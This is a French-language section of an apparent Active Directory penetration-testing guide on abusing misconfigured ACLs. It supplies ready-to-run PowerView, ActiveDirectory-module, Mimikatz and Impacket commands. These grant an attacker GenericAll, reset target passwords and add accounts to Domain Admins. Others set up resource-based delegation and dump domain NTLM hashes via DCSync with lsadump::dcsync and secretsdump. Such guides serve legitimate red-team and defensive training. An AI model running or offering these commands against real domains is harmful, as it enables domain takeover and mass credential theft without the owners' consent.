# V.A. Exploitation des ACLs Vulnérables

L'énumération des ACLs (voir [IV.B Énumération des ACLs](../04-post-compromission/B-enumeration-acls.md)) peut révéler des permissions mal configurées sur des objets Active Directory. Ces permissions peuvent être exploitées pour élever les privilèges.

## 1. Droits `GenericAll` / `GenericWrite` / `WriteDacl` / `WriteOwner`

Ces droits sont parmi les plus puissants et permettent souvent un contrôle total de l'objet.

*   **Sur un Utilisateur Cible :**
    *   **Objectif :** Changer le mot de passe, ajouter à des groupes privilégiés, modifier des attributs pour la délégation.
    *   **Outils / Commandes :**
        *   **PowerView :**
            ```powershell
            # Si vous avez WriteDacl, vous pouvez vous donner GenericAll
            Add-ObjectAcl -PrincipalIdentity <ATTAQUANT> -Rights GenericAll -TargetIdentity <UTILISATEUR_CIBLE>
            # Puis changer le mot de passe
            Set-DomainUserPassword -Identity <UTILISATEUR_CIBLE> -Password "NouveauMotDePasse123!"
            # Ajouter à un groupe (si vous avez GenericAll/WriteProperty sur le groupe ou l'utilisateur)
            Add-DomainGroupMember -Identity "Domain Admins" -Members <UTILISATEUR_CIBLE>
            ```
        *   **Module ActiveDirectory :**
            ```powershell
            # Changer le mot de passe (nécessite des droits spécifiques ou GenericAll)
            Set-ADAccountPassword -Identity <UTILISATEUR_CIBLE> -NewPassword (ConvertTo-SecureString "NouveauMotDePasse123!" -AsPlainText -Force) -Reset
            # Ajouter à un groupe
            Add-ADGroupMember -Identity "Domain Admins" -Members <UTILISATEUR_CIBLE>
            ```
*   **Sur un Groupe Cible (ex: "Domain Admins") :**
    *   **Objectif :** S'ajouter soi-même ou un compte contrôlé au groupe.
    *   **Outils / Commandes :**
        *   **PowerView :**
            ```powershell
            Add-DomainGroupMember -Identity "Domain Admins" -Members <ATTAQUANT_OU_COMPTE_CONTROLE>
            ```
        *   **Module ActiveDirectory :**
            ```powershell
            Add-ADGroupMember -Identity "Domain Admins" -Members <ATTAQUANT_OU_COMPTE_CONTROLE>
            ```
*   **Sur un Objet Ordinateur :**
    *   **Objectif :** Potentiellement abuser de la délégation basée sur les ressources (RBCD) ou d'autres attaques.
    *   **Outils / Commandes (pour RBCD) :**
        *   **PowerView / Module ActiveDirectory :**
            ```powershell
            # Si vous avez GenericAll/WriteProperty sur l'ordinateur cible pour modifier msDS-AllowedToActOnBehalfOfOtherIdentity
            # $ordinateur_cible = Get-ADComputer <ORDINATEUR_CIBLE>
            # $attaquant_machine = Get-ADComputer <MACHINE_ATTAQUANT> (ou un compte machine créé)
            # Set-ADComputer $ordinateur_cible -PrincipalsAllowedToDelegateToAccount $attaquant_machine
            # Voir la section [V.C Délégations Kerberos](./C-delegation-kerberos.md) pour l'exploitation complète.
            ```
*   **Sur un GPO :**
    *   **Objectif :** Modifier le GPO pour exécuter du code, ajouter des admins locaux, etc. Voir [V.F Abus des GPO](./F-group-policy-abuse.md).

## 2. Droit `WriteProperty` sur des Attributs Spécifiques

*   **`member` (sur un groupe) :** Permet d'ajouter/retirer des membres.
    *   Exploitation : Similaire à `GenericAll` sur un groupe.
*   **`userAccountControl` (sur un utilisateur/ordinateur) :** Permet de modifier des flags (ex: activer/désactiver le compte, `DONT_EXPIRE_PASSWORD`).
*   **`servicePrincipalName` (sur un utilisateur/ordinateur) :** Peut être utilisé pour le Kerberoasting (si on peut ajouter un SPN à un compte dont on peut obtenir le hash) ou pour des attaques de délégation.
*   **`msDS-AllowedToActOnBehalfOfOtherIdentity` (sur un ordinateur) :** Permet de configurer la délégation basée sur les ressources.
*   **`gPLink` / `gPOptions` (sur une OU/Domaine) :** Permet de lier/délier des GPOs.

## 3. Droits Étendus Spécifiques

*   **`User-Force-Change-Password` (sur un utilisateur) :**
    *   **Objectif :** Forcer la réinitialisation du mot de passe de l'utilisateur lors de sa prochaine connexion (si on peut intercepter cette connexion ou si l'utilisateur est déjà connecté et que le changement est immédiat).
    *   **Outils / Commandes :**
        *   **PowerView :**
            ```powershell
            Set-DomainUserPassword -Identity <UTILISATEUR_CIBLE> -Password "NouveauMotDePasse123!" -ForceChange # Peut nécessiter des droits supplémentaires
            ```
        *   **Module ActiveDirectory :**
            ```powershell
            Set-ADUser -Identity <UTILISATEUR_CIBLE> -ChangePasswordAtLogon $true
            # Puis, si on a un accès au compte, on peut se connecter et le changer.
            # Ou utiliser des outils pour le faire à distance si possible.
            ```
*   **`DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All` (DCSync) :**
    *   **Objectif :** Permet de demander la réplication des secrets du domaine (hashes NTLM) depuis un DC. Nécessite ces droits sur l'objet Domaine.
    *   **Outils :**
        *   **Mimikatz :**
            ```
            lsadump::dcsync /user:<DOMAINE>\<UTILISATEUR_CIBLE>
            lsadump::dcsync /domain:<DOMAINE.LOCAL> /all /csv
            ```
        *   **Impacket `secretsdump.py` :**
            ```bash
            secretsdump.py <DOMAINE.LOCAL>/<UTILISATEUR_AVEC_DROITS_DCSYNC>:<MOT_DE_PASSE>@<IP_DC> -just-dc-user <UTILISATEUR_A_DUMPER>
            secretsdump.py <DOMAINE.LOCAL>/<UTILISATEUR_AVEC_DROITS_DCSYNC>@<IP_DC> -just-dc-ntlm
            ```

## Outils d'Exploitation Généraux
*   **PowerView :** Fonctions `Set-ObjectAcl`, `Add-ObjectAcl`, `Invoke-ACLScanner`.
*   **Module ActiveDirectory PowerShell :** `Get-Acl`, `Set-Acl`.
*   **BloodHound :** Visualiser les chemins d'attaque basés sur les ACLs.
*   **dsacls.exe / cacls.exe / icacls.exe (natifs Windows) :** Pour modifier les ACLs en ligne de commande.

**Note Importante :** Toujours agir avec prudence lors de la modification des ACLs. Une mauvaise manipulation peut avoir des conséquences graves sur la stabilité du domaine. Documenter chaque action. 